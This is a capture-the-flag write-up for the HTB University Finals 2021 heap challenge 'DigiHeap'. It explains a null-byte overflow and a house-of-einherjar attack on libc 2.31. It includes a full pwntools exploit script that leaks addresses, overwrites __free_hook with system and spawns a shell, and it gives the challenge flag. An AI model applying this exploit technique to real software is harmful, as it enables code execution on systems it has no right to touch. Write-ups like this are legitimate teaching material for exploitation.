---
title: DigiHeap - HTB University Finals 2021
date: 2021-03-06 12:00:00
tags:
  - Linux
  - Exploitation
  - Heap
---

**tl;dr**
Simple null byte overflow, house of einherjar on libc 2.31

## Initial analysis & Reversing
The binary was a 64-bit one with a menu driver, with options to add, edit, delete and view a monster. A monster struct contained 4 integer values for health, attack, defence and speed, and a pointer to a heap chunk which contained an optional `description`. The `add` option allowed us to enter an index less than 10, as well as 4 integer values, and a description of any size less than 0x1000, which would `malloc` the aforementioned size. The `edit` option allowed us to edit the description of a monster at any index in use, and we could only do so once(checked with a global variable). Edit had a clear null byte overflow, as if we entered `size` number of bytes, `description[size]` would be set to 0. the `delete` option freed both the `description` chunk and the `monster` chunk of a particular index, and nulled out the pointer to the monster chunk. The `view` option printed the integer values, and the description(if it existed), if the monster chunk of that particular index existed.

## Exploitation
Most of the exploitation could be done using the `description` field, as this allowed us to allocate and free chunks of any size. To get a heap leak, we could simply allocate a couple of chunks of the same size, free them, then allocate another one, with only a single byte, say `a` as input. As our input was not null appended, we could simply leak the tcache fd pointer (except the lsb, which is irrelevant), Similarly if we allocated a chunk of size > `0x420`, we could leak libc as well, by leaking the unsorted bin fd (main arena pointer).

Now that we had leaks, we had to abuse the null byte overflow via `house of einherjar` and get allocation on `__free_hook`. To do this, we simply had to overflow the prev_in_use bit of a chunk, and set the prev_size of that chunk to point to a fake chunk we created, which would pass the safe unlink check `(P->fd->bk == P && P->bk->fd == P)`, as well as the `size vs prev_size` check. To do this, we set up 3 `0x100` chunks (the first one containing the fake chunk), and a `0x500` chunk after them (to avoid tcache). Then we edited the 3rd `0x100` chunk to set `prev_size`, and overflow the `prev_in_use` bit of the `0x500` chunk. Then we free the `0x500` chunk, which backward coalesces with the fake chunk. Then, we can free the second `0x100` chunk, and if we allocate a size greater than `0x100`, say `0x200`, we get an overlap with the freed `0x100` chunk. Then we can overwrite `tcache fd` to `__free_hook`, and get allocation there, overwrite `__free_hook` to `system`, free any chunk containing `/bin/sh\x00`, and we pop a shell!

## Exploit script

```python
#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'docker.hackthebox.eu', 30692
binary = './digiheap'
brkpts = '''
'''

elf = ELF("digiheap")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla(">> ", str(idx))

def add(idx, description = None, size = 0, val = 1):
    choice(1)
    sla("index: ", str(idx))
    for i in range(4):
        sla("value: ", str(val))
    if description is not None:
        sla("(Y/N): ", "Y")
        sla("Size: ", str(size))
        sa("description: ", description)
    else:
        sla("(Y/N): ", "N")

def edit(idx, description):
    choice(2)
    sla("index: ", str(idx))
    sa("description: ", description)

def delete(idx):
    choice(3)
    sla("index: ", str(idx))

def show(idx):
    choice(4)
    sla("index: ", str(idx))

if __name__ == "__main__":
    add(0, "a"*8, 0x68)
    add(1, "b"*8, 0x68)
    delete(1)
    delete(0)
    add(0, "a", 0x68)
    show(0)
    reu("Description: a")
    heap = u64(("\x00" + re(2)).ljust(8,"\x00")) - 0x1300
    log.info("Heap : "+hex(heap))
    
    delete(0)
    add(0, "temp", 0x500)
    add(1, "temp", 0x10)
    delete(0)
    add(0, "a", 0x500)
    show(0)
    reu("Description: a")
    libc.address = u64(("\x00" + re(5)).ljust(8,"\x00")) - 0x1e4c00
    log.info("Libc : "+hex(libc.address))
    system = libc.symbols['system']
    free_hook = libc.symbols['__free_hook']

    delete(0)
    delete(1)
    add(0, "useless", 0x400)
    fake = p64(0)
    fake += p64(0x325)
    fake += p64(heap + 0x18c0)
    fake += p64(heap + 0x18c0)
    add(1, fake, 0x108)
    add(2, "temp", 0x108)
    add(3, "temp", 0x108)
    add(4, "overflow", 0x4f8)
    add(5, "temp", 0x108)
    add(6, "/bin/sh\x00", 0x28)
    payload = "a"*0x100 + p64(0x320)
    edit(3, payload)
    delete(4)
    delete(5)
    delete(2)
    payload = "a"*0xf8
    payload += p64(0x111)
    payload += p64(free_hook)
    add(2, payload, 0x200)
    add(4, p64(system), 0x108)
    add(5, p64(system), 0x108)
    delete(6)
    io.interactive()
```

## Flag
`HTB{h0us3_Of_D0ubl3_NuLL}`